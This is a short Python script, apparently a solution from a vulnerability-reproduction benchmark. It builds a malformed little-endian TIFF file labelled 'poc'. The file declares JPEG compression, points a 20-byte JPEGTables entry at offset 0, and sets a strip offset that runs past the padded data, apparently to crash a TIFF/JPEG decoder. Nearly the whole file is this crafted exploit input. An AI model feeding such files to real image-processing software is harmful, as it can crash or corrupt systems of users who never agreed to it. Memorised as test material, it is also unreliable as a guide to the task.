import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)
        tags = [
            (256, 3, 1, 64),   # ImageWidth
            (257, 3, 1, 64),   # ImageLength
            (258, 3, 1, 8),    # BitsPerSample
            (259, 3, 1, 7),    # Compression JPEG
            (262, 3, 1, 1),    # Photometric
            (273, 4, 1, 134),  # StripOffsets
            (278, 4, 1, 64),   # RowsPerStrip
            (279, 4, 1, 28),   # StripByteCounts
            (277, 3, 1, 1),    # SamplesPerPixel
            (347, 7, 20, 0),   # JPEGTables offset 0
        ]
        typesizes = {1:1, 2:1, 3:2, 4:4, 5:8, 6:1, 7:1, 8:2, 9:4, 10:8, 11:4, 12:8}
        ifd_bytes = struct.pack('<H', len(tags))
        for tag_id, typ, count, val in tags:
            size = count * typesizes.get(typ, 0)
            if size <= 4:
                if typ == 3:
                    vbytes = struct.pack('<H', val) + b'\x00\x00'
                elif typ in (4, 7):
                    vbytes = struct.pack('<I', val)
                else:
                    vbytes = struct.pack('<I', val)
                tag_bytes = struct.pack('<HHI', tag_id, typ, count) + vbytes
            else:
                tag_bytes = struct.pack('<HHI', tag_id, typ, count) + struct.pack('<I', val)
            ifd_bytes += tag_bytes
        ifd_bytes += struct.pack('<I', 0)
        poc = header + ifd_bytes
        poc += b'\x00' * 28
        return poc
